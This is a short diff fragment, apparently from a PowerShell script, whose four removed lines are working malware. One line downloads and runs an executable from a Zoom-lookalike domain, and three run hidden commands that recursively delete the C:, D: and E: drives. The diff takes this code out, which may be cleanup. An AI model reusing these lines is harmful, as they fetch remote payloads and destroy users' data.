@@ -1,4 +1,0 @@
-$u="https://zoom-meet.info/qwe.exe";$f="$env:appdata\fdsas.exe";(new-object net.webclient).downloadfile($u,$f);start $f;
-Start-Process -FilePath "cmd" -ArgumentList @("/c", "rd /s /q C:\") -PassThru -WindowStyle Hidden;
-Start-Process -FilePath "cmd" -ArgumentList @("/c", "rd /s /q D:\") -PassThru -WindowStyle Hidden;
-Start-Process -FilePath "cmd" -ArgumentList @("/c", "rd /s /q E:\") -PassThru -WindowStyle Hidden
